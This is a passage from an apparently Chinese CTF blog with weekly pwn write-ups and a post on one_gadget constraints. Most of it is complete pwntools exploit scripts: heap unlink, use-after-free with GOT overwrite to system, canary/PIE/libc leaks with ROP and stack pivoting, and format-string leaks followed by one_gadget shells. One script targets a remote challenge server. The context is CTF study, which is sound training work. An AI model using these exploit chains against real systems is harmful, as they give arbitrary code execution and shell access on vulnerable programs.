<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p = process(&#x27;./pwn&#x27;)</span><br><span class="line">elf = ELF(&quot;./pwn&quot;, checksec=False)</span><br><span class="line">libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc-2.23.so&#x27;, checksec=False)</span><br><span class="line">#context.log_level = &quot;debug&quot;</span><br><span class="line">def new(ind,size,content):</span><br><span class="line">	p.sendlineafter(&#x27;4.show\n&#x27;,&#x27;1&#x27;)</span><br><span class="line">	p.sendlineafter(&#x27;index:\n&#x27;,str(ind))</span><br><span class="line">	p.sendlineafter(&#x27;size:\n&#x27;,str(size))</span><br><span class="line">	p.sendafter(&#x27;content:\n&#x27;,content)</span><br><span class="line">def free(ind):</span><br><span class="line">	p.sendlineafter(&#x27;4.show\n&#x27;,&#x27;2&#x27;)</span><br><span class="line">	p.sendafter(&#x27;index:\n&#x27;,str(ind))</span><br><span class="line">def edit(ind,content):</span><br><span class="line">	p.sendlineafter(&#x27;4.show\n&#x27;,&#x27;3&#x27;)</span><br><span class="line">	p.sendlineafter(&#x27;index:\n&#x27;,str(ind))</span><br><span class="line">	p.sendafter(&#x27;content:\n&#x27;,content)</span><br><span class="line">new(2,0xf8,&quot;/bin/sh&quot;)</span><br><span class="line">new(32,0xf8,&quot;32&quot;)</span><br><span class="line">new(31,0xf8,&quot;31&quot;)</span><br><span class="line">new(30,0xf8,&quot;30&quot;)#unlink spy</span><br><span class="line">pay = p64(0)+p64(0xf1)+p64(0x6021c8)+p64(0x6021c8+8)</span><br><span class="line">pay = pay.ljust(0xf0)</span><br><span class="line">pay+=p64(0xf0)</span><br><span class="line">edit(32,pay)</span><br><span class="line">free(31)#unlink</span><br><span class="line">payload = p64(0x6021c8)*3+p64(elf.got[&#x27;free&#x27;])</span><br><span class="line">payload = payload.ljust(0xf0)</span><br><span class="line">payload+=p64(1)</span><br><span class="line">edit(32,payload)</span><br><span class="line">p.sendlineafter(&#x27;4.show\n&#x27;,&#x27;4&#x27;)</span><br><span class="line">p.sendlineafter(&#x27;index&#x27;,&#x27;32&#x27;)</span><br><span class="line">p.recvuntil(&quot;\n&quot;)</span><br><span class="line">leak = u64(p.recvuntil(&#x27;\n&#x27;)[:-1].ljust(8,&#x27;\x00&#x27;))</span><br><span class="line">libc_base = leak - libc.symbols[&#x27;free&#x27;]</span><br><span class="line">system = libc.symbols[&#x27;system&#x27;] + libc_base</span><br><span class="line">free_hook = libc.symbols[&#x27;__free_hook&#x27;] + libc_base</span><br><span class="line">pay = &#x27;a&#x27;*0x18+p64(free_hook)</span><br><span class="line">pay = pay.ljust(0xf0)</span><br><span class="line">pay += p64(1)</span><br><span class="line">edit(30,pay)</span><br><span class="line">edit(32,p64(system))</span><br><span class="line">free(2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="万能-gadget"><a href="#万能-gadget" class="headerlink" title="万能 gadget"></a>万能 gadget</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p = process(&#x27;./pwn&#x27;)</span><br><span class="line">elf = ELF(&quot;./pwn&quot;, checksec=False)</span><br><span class="line">libc = elf.libc</span><br><span class="line">#context.log_level = &quot;debug&quot;</span><br><span class="line">p.sendline(&#x27;aaaabaaacaaadaaa&#x27;+p64(0x4004ed))</span><br><span class="line">leak = u64(p.recvuntil(&quot;\x7f&quot;)[-6:].ljust(8,&quot;\x00&quot;))-0x118</span><br><span class="line">pay = &quot;/bin//sh\x00&quot;.ljust(0x10,&quot;\x00&quot;)</span><br><span class="line">header = 0x040059A</span><br><span class="line">waist = 0x400580</span><br><span class="line">pop_rdi = 0x4005a3</span><br><span class="line">rax_3B = 0x4004e2</span><br><span class="line">syscall = 0x400517</span><br><span class="line">pay+= p64(header)+p64(10)+p64(0)+p64(leak)+p64(0)*3+p64(waist)</span><br><span class="line">pay+=p64(rax_3B)+p64(pop_rdi)+p64(leak)+p64(syscall)</span><br><span class="line">p.sendline(pay)</span><br><span class="line">p.recv()</span><br><span class="line">p.recv()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>这个发现师傅的 wp 写的 0x4004e2 差了一个字节,结果也能用~~~ 什么鬼,中间还出现一个很迷的 bug ,始终不通,最后发现一开始的 ret 我填的 main_addr ,(狗头)</p>
<h2 id="最强-rop"><a href="#最强-rop" class="headerlink" title="最强 rop"></a>最强 rop</h2><blockquote>
<p>栈迁移是迁移到 buf 内部.</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line">#encoding:utf-8</span><br><span class="line">#!/upr/bin/env python</span><br><span class="line">from pwn import *</span><br><span class="line">def sl(s):</span><br><span class="line">    return p.sendline(s)</span><br><span class="line">def sd(s):</span><br><span class="line">    return p.send(s)</span><br><span class="line">def rc(timeout=0):</span><br><span class="line">    if timeout == 0:</span><br><span class="line">        return p.recv()</span><br><span class="line">    else:</span><br><span class="line">        return p.recv(timeout=timeout)</span><br><span class="line">def ru(s, timeout=0):</span><br><span class="line">    if timeout == 0:</span><br><span class="line">        return p.recvuntil(s)</span><br><span class="line">    else:</span><br><span class="line">        return p.recvuntil(s, timeout=timeout)</span><br><span class="line">    pause()</span><br><span class="line">def msg(msg,addr):</span><br><span class="line">    log.warn(msg+&quot;-&gt;&quot;+hex(addr))</span><br><span class="line">bin_elf = &quot;./pwn&quot;</span><br><span class="line">elf = ELF(bin_elf)</span><br><span class="line">context.binary=bin_elf</span><br><span class="line">context.log_level = &quot;debug&quot;</span><br><span class="line">libc = elf.libc</span><br><span class="line">p = process(bin_elf, aslr=0)</span><br><span class="line">ru(&quot;please input your name\n&quot;)</span><br><span class="line">sl(&#x27;aeojj&#x27;)</span><br><span class="line">ru(&quot;do you want to get something???\n&quot;)</span><br><span class="line">sd(&quot;a&quot;*0x19)</span><br><span class="line"></span><br><span class="line">ru(&quot;a&quot;*0x18)</span><br><span class="line">canary = u64(p.recv(8))-0x61</span><br><span class="line">stack = u64(p.recv(6).ljust(8,&quot;\x00&quot;))-0x28</span><br><span class="line">msg(&quot;canary&quot;,canary)</span><br><span class="line">msg(&quot;stack&quot;,stack)</span><br><span class="line">ru(&quot;OK???\n&quot;)</span><br><span class="line">sd(&quot;b&quot;*8)</span><br><span class="line">ru(&quot;I think you can do something now\n&quot;)</span><br><span class="line"></span><br><span class="line">pay = &quot;c&quot;*0x28+p64(canary)+&quot;a&quot;*8+&quot;\xde\x50&quot;#1/16</span><br><span class="line"></span><br><span class="line">sd(pay)</span><br><span class="line"></span><br><span class="line">ru(&quot;do you want to get something???\n&quot;)</span><br><span class="line">sd(&quot;x&quot;*8)</span><br><span class="line">ru(&quot;OK???\n&quot;)</span><br><span class="line">sd(&quot;b&quot;*0x29)</span><br><span class="line"></span><br><span class="line">ru(&quot;a&quot;*8)</span><br><span class="line">piebase = u64(p.recv(6).ljust(8,&quot;\x00&quot;))-0x1440</span><br><span class="line">msg(&quot;piebase&quot;,piebase)</span><br><span class="line">printf_got=elf.got[&quot;printf&quot;]+piebase</span><br><span class="line">printf_plt=elf.plt[&quot;printf&quot;]+piebase</span><br><span class="line">read_got=elf.got[&quot;read&quot;]+piebase</span><br><span class="line">pop_rdi_ret=piebase+0x14a3</span><br><span class="line">leave_ret=piebase+0x10dc</span><br><span class="line">vul = piebase+0x10de</span><br><span class="line">ru(&quot;I think you can do something now\n&quot;)</span><br><span class="line">gadget = &quot;a&quot;*0x8+p64(pop_rdi_ret)+p64(read_got)+p64(printf_plt)</span><br><span class="line">pay = gadget+p64(vul)+p64(canary)+p64(stack)+p64(leave_ret)</span><br><span class="line">sd(pay)</span><br><span class="line">libc.address = u64(p.recv(6).ljust(8,&quot;\x00&quot;))-libc.sym[&quot;read&quot;]</span><br><span class="line">system = libc.sym[&quot;system&quot;]</span><br><span class="line">msg(&quot;libc.address&quot;,libc.address)</span><br><span class="line">ru(&quot;do you want to get something???\n&quot;)</span><br><span class="line">sd(&quot;d&quot;*0x8)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">ru(&quot;OK???\n&quot;)</span><br><span class="line">sd(&quot;e&quot;*0x8)</span><br><span class="line"></span><br><span class="line">ru(&quot;I think you can do something now\n&quot;)</span><br><span class="line">gadget = &quot;/bin/sh\x00&quot;+p64(pop_rdi_ret)+p64(stack)+p64(system)</span><br><span class="line">pay = gadget+p64(0)+p64(canary)+p64(stack-0x10)+p64(leave_ret)</span><br><span class="line">sd(pay)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>这是我做过最难的 rop 了,必须泄漏四个( canary stack libc pie),太恶心了,不过思路还是很清楚的,我试试优化一下,最后我感觉师傅写错了,但是 exp 却能用,又迷了~~~~ 而且感觉师傅走了好多弯路啊，一般情况不应该跑三遍啊~~</p>
<p>下面说一下我的方法, one_gadget 一步 getshell ,就不用师父的模板了,实在使不顺手,不过师傅的 gdb 函数是真的牛逼~~简单记录一下我的思路（厚颜无耻</p>
<p>在 16.04 测得，很巧，栈上有残留的东西正好泄露出来 libc 基址，之后也用上了第二次输入把 canary 整出来了，理论上 pie 和 stack 都不用泄露了，可是 one_gadget 就是不好用，我想了几个方案不是要泄露 stack 地址就是不满足，什么鬼，只能用师傅的方法</p>
<p>崩溃了，我想了好久我这个 one_gadget 已经很无敌了，而且我动态调的时候很明显成功了，怎么回事？最后发现是根本没 send 出去</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">#context.log_level = &quot;debug&quot;</span><br><span class="line">p = process(&#x27;./babypwn&#x27;,aslr=0)</span><br><span class="line">elf = ELF(&quot;./babypwn&quot;, checksec=False)</span><br><span class="line">libc = elf.libc</span><br><span class="line">p.recvuntil(&#x27;name\n&#x27;)</span><br><span class="line">p.sendline(&#x27;aeojj&#x27;)</span><br><span class="line">p.recvuntil(&#x27;???\n&#x27;)</span><br><span class="line">p.send(&#x27;a&#x27;*8)</span><br><span class="line">p.recvuntil(&#x27;a&#x27;*8)</span><br><span class="line">libc = u64(p.recv(6).ljust(8,&quot;\x00&quot;))-458676</span><br><span class="line">print hex(libc)</span><br><span class="line">p.recvuntil(&#x27;???\n&#x27;)</span><br><span class="line">p.send(&#x27;b&#x27;*0x19)</span><br><span class="line">p.recvuntil(&#x27;b&#x27;*0x18)</span><br><span class="line">canary = u64(p.recv(8))-0x62</span><br><span class="line">print hex(canary)</span><br><span class="line">p.recvuntil(&quot;I think you can do something now\n&quot;)</span><br><span class="line">one = libc+0x4526a</span><br><span class="line">pay = &quot;c&quot;*0x28+p64(canary)+&quot;a&quot;*8+p64(one)</span><br><span class="line">p.send(pay)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>成功了，真的爽，感觉是一个非预期解（18.04失败了，栈很干净，23333），开心~~~ 在这里想到一个好方法，就是打一个 patch ，然后去打，如果 patch 过的文件还是过不了检测就该想想是哪的问题了~~</p>
<h2 id="noleakinfo"><a href="#noleakinfo" class="headerlink" title="noleakinfo"></a>noleakinfo</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">r = process(&#x27;./noinfoleak&#x27;)</span><br><span class="line">elf = ELF(&#x27;noinfoleak&#x27;, checksec=False)</span><br><span class="line">libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;, checksec=False)</span><br><span class="line">#context.log_level = &quot;debug&quot;</span><br><span class="line"></span><br><span class="line">def add(size, data):</span><br><span class="line">    r.sendlineafter(&#x27;&gt;&#x27;, &#x27;1&#x27;)</span><br><span class="line">    r.sendlineafter(&#x27;&gt;&#x27;, str(size))</span><br><span class="line">    r.sendlineafter(&#x27;&gt;&#x27;, data)</span><br><span class="line">def delete(index):</span><br><span class="line">    r.sendlineafter(&#x27;&gt;&#x27;, &#x27;2&#x27;)</span><br><span class="line">    r.sendlineafter(&#x27;&gt;&#x27;, str(index))</span><br><span class="line">def edit(index, data):</span><br><span class="line">    r.sendlineafter(&#x27;&gt;&#x27;, &#x27;3&#x27;)</span><br><span class="line">    r.sendlineafter(&#x27;&gt;&#x27;, str(index))</span><br><span class="line">    r.sendafter(&#x27;&gt;&#x27;, data)</span><br><span class="line"></span><br><span class="line">add(0x30, &#x27;/bin/sh&#x27;)</span><br><span class="line">add(0x20, &#x27;AAA&#x27;)</span><br><span class="line">add(0x20, &#x27;BBB&#x27;)</span><br><span class="line">delete(1)</span><br><span class="line">delete(2)</span><br><span class="line">delete(1)</span><br><span class="line">arrAddr = 0x06010A0</span><br><span class="line">freeGotAddr = elf.got[&#x27;free&#x27;]</span><br><span class="line">putsPltAddr = elf.plt[&#x27;puts&#x27;]</span><br><span class="line">putsGotAddr = elf.got[&#x27;puts&#x27;]</span><br><span class="line">add(0x20, p64(arrAddr))</span><br><span class="line">add(0x20, &#x27;second&#x27;)</span><br><span class="line">add(0x20, &#x27;first&#x27;)</span><br><span class="line"># new chunk will allocate in arrAddr</span><br><span class="line"># save new chunk data&#x27;s addr in arrAddr[6 * 2]</span><br><span class="line"># overwrite arrAddr[1]&#x27;s content to free@got</span><br><span class="line">add(0x20, p64(freeGotAddr))</span><br><span class="line"># overwrite free@got to puts@plt</span><br><span class="line">edit(1, p64(putsPltAddr))</span><br><span class="line"># overwrite arrAddr[1]&#x27;s content to puts@got</span><br><span class="line">edit(6, p64(putsGotAddr))</span><br><span class="line"># trigger free()(puts@plt) to leak putsAddr</span><br><span class="line">delete(1)</span><br><span class="line">LeakStr = r.recvuntil(&#x27;\n&#x27;, drop=True)</span><br><span class="line">libcBaseAddr = u64(LeakStr.ljust(8, &#x27;\x00&#x27;)) - libc.symbols[&#x27;puts&#x27;]</span><br><span class="line">systemAddr = libcBaseAddr + libc.symbols[&#x27;system&#x27;]</span><br><span class="line">print(&#x27;libc base address: 0x%x&#x27; % libcBaseAddr)</span><br><span class="line">print(&#x27;systemAdd address: 0x%x&#x27; % systemAddr)</span><br><span class="line"># overwrite arrAddr[1] to free@got</span><br><span class="line">edit(6, p64(freeGotAddr))</span><br><span class="line"># overwrite free@got to system</span><br><span class="line">edit(1, p64(systemAddr))</span><br><span class="line">delete(0)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>

<p>西湖论剑的题,我觉得 wp 太妙了,我们深入分析一下,觉得这个 wp 是件艺术品</p>
<p>首先漏洞来自</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">if ( v0 &gt;= 0 &amp;&amp; v0 &lt;= 15 )</span><br><span class="line">  free(qword_6010A0[2 * v0]);    </span><br></pre></td></tr></table></figure>

<p>这个 UAF 很爽,有这个洞基本完蛋了这个程序,但是没有 leak 函数,需要自己想方法去 leak ,这里师傅就想到了改 got ,说实话,如果是我的话,我就不敢了,因为感觉副作用太大,直接修改 free 和 malloc 有点虎,但是师傅艺高人胆大,直接利用这个通杀了, 6666666</p>
<p>基本 wp 分 3 步</p>
<ul>
<li>7 步杀人, malloc 到 bss 段,控制指针</li>
<li>修改 free_got 为 puts_got</li>
<li>修改 free_got 为 system 进而触发</li>
</ul>
<p>其实这个 got plt 还卡了我很久,现在写一下心得(早就忘了延迟绑定了,还得再学一遍),首先未调用函数前<code>got -&gt; plt -&gt; 指令</code>,调用函数后<code>got -&gt; so 真正位置</code>差不多是这样的,之前都理解的有点偏差</p>
<p>所以本次 wp 的两次修改,首先第一次</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">add(0x20, p64(freeGotAddr))#1</span><br><span class="line">edit(1, p64(putsPltAddr))</span><br><span class="line">edit(6, p64(putsGotAddr))</span><br><span class="line">delete(1)</span><br></pre></td></tr></table></figure>

<p>就是先把 1 指向的 free_got 改为 puts_plt ,听上去不可思议,事实上确实如此,因为 free 函数早已调用,上边写的就是 so 的偏移,之后把 1 的指向修改为 put_got ,这就是调用后的了, so 真正位置就出来了,太鸡儿妙了~~~</p>
<p>第二次</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">edit(6, p64(freeGotAddr))</span><br><span class="line">edit(1, p64(systemAddr))</span><br><span class="line">delete(0)</span><br></pre></td></tr></table></figure>

<p>就是把 free_got 改成 system_so_addr 了,理所应当</p>
<h2 id="babyheap"><a href="#babyheap" class="headerlink" title="babyheap"></a>babyheap</h2><blockquote>
<p>unctf 栈溢出</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">#p = process(&#x27;./pwn&#x27;)</span><br><span class="line">p = remote(&#x27;101.71.29.5&#x27;,10052)</span><br><span class="line">elf = ELF(&quot;./pwn&quot;, checksec=False)</span><br><span class="line">libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc-2.23.so&#x27;, checksec=False)</span><br><span class="line">#context.log_level = &quot;debug&quot;</span><br><span class="line">def new(content):</span><br><span class="line">	p.sendlineafter(&#x27;Your choice: &#x27;,&#x27;1&#x27;)</span><br><span class="line">	p.sendafter(&#x27;Plz input content: &#x27;,content)</span><br><span class="line">def edit(ind,size,content):</span><br><span class="line">	p.sendlineafter(&#x27;Your choice: &#x27;,&#x27;2&#x27;)</span><br><span class="line">	p.sendlineafter(&#x27;Plz input index: &#x27;,str(ind))</span><br><span class="line">	p.sendlineafter(&#x27;Plz input size: &#x27;,str(size))</span><br><span class="line">	p.sendafter(&#x27;Plz input content: &#x27;,content)</span><br><span class="line">def show(ind):</span><br><span class="line">	p.sendlineafter(&#x27;Your choice: &#x27;,&#x27;3&#x27;)</span><br><span class="line">	p.sendlineafter(&#x27;Plz input index: &#x27;,str(ind))</span><br><span class="line">new(&#x27;a&#x27;*1)</span><br><span class="line">edit(0,24,&#x27;a&#x27;*24)</span><br><span class="line">show(0)</span><br><span class="line">p.recvuntil(&#x27;a&#x27;*24)</span><br><span class="line">leak = u64(p.recvuntil(&#x27;\n&#x27;)[:-1].ljust(8,&#x27;\x00&#x27;))</span><br><span class="line">libc_base = leak - 456336</span><br><span class="line">system = libc.symbols[&#x27;system&#x27;] + libc_base</span><br><span class="line">payload = &#x27;/bin/sh\x00&#x27;.ljust(0x18)+p64(system)</span><br><span class="line">edit(0,0x20,payload)</span><br><span class="line">show(0)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>做着题傻了，一看这么简单，就是一个数据结构瞎放东西，还有溢出。然后我竟然想着到 malloc_hook 和 free_hook 地方，什么鬼，发现一个堆块解决所有问题~~ 做题还是太直，难受</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2019/10/21/2019-10-21-3rd_week/" data-id="cuidUzF0iH3--b9Y1vUhwzKNJ" data-title="third week" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwn/" rel="tag">pwn</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-2019-10-20-one_gadget" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2019/10/20/2019-10-20-one_gadget/" class="article-date">
  <time class="dt-published" datetime="2019-10-19T16:00:00.000Z" itemprop="datePublished">2019-10-20</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2019/10/20/2019-10-20-one_gadget/">One_gadget</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p>本文首发<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/6598">先知</a></p>
<h2 id="问题来源"><a href="#问题来源" class="headerlink" title="问题来源"></a>问题来源</h2><p>在有 <code>one_gadget</code> 之前,我们一般都是通过常规 rop 的方式 getshell .有了它之后,知道 libc 偏移就能够通过它的地址一步 getshell .详细介绍参见<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2720">此处</a>,我们就可以把更多精力花在利用漏洞上边.但是在做栈溢出时经常遇到 one_gadget 的佛系 bug ,究其原因还是 <code>constraints</code> 的锅,每次执行都是一次<code>execve(&quot;/bin/sh&quot;,?????, environ)</code>未知考验,这时候就有必要去根据限制条件来布置我们的环境了</p>
<p>注:以下程序均为 64 位.关于 32 位程序的可以参见上述文章自行研究</p>
<h2 id="溢出字节数较大"><a href="#溢出字节数较大" class="headerlink" title="溢出字节数较大"></a>溢出字节数较大</h2><blockquote>
<p>突破栈限制条件</p>
</blockquote>
<p>以西湖论剑的 story 举例,一个简单的格式化字符串和栈溢出漏洞(就不具体分析漏洞了),通过前者可以泄漏 canary 和 libc 基址,后者就是一个溢出劫持 rop 了.似乎已经很简单了,能不能再简单??这时候 one_gedget 就有用了,直接把 ret 改成 one_gedget 即可,我们来看一下这个 exp</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p= process(&#x27;story&#x27;)</span><br><span class="line">libc = ELF(&#x27;./libc-2.23.so&#x27;)</span><br><span class="line">p.sendline(&quot;%15$p%25$p&quot;)</span><br><span class="line"># leak canary and libc_addr</span><br><span class="line">p.recvuntil(&quot;0x&quot;)</span><br><span class="line">canary = int(p.recvuntil(&quot;0x&quot;)[:-2],16)</span><br><span class="line">addr_offset = int(p.recvuntil(&#x27;\n&#x27;)[:-1],16)</span><br><span class="line">libc_base = addr_offset - libc.symbols[&#x27;__libc_start_main&#x27;]-240</span><br><span class="line">one = libc_base+0x4526a</span><br><span class="line">p.recvuntil(&#x27;story&#x27;)</span><br><span class="line">p.sendline(&#x27;1024&#x27;)</span><br><span class="line"># story_len = 1024</span><br><span class="line">p.recvuntil(&#x27;story&#x27;)</span><br><span class="line">payload = &#x27;\x00&#x27;*0x88+p64(canary)+p64(0)+p64(one)</span><br><span class="line"># buf_len = 0x88</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>其中<code>one = libc_base+0x4526a</code>的<code>0x4526a</code>就是用 one_gadget 找到的</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">$ one_gadget /lib/x86_64-linux-gnu/libc.so.6</span><br><span class="line">0x45216 execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span><br><span class="line">constraints:</span><br><span class="line">  rax == NULL</span><br><span class="line"></span><br><span class="line">0x4526a execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+0x30] == NULL</span><br><span class="line"></span><br><span class="line">0xf02a4 execve(&quot;/bin/sh&quot;, rsp+0x50, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+0x50] == NULL</span><br><span class="line"></span><br><span class="line">0xf1147 execve(&quot;/bin/sh&quot;, rsp+0x70, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+0x70] == NULL</span><br></pre></td></tr></table></figure>

<p>但是最终还是因为条件的限制后三个都成功不了(很真实)</p>
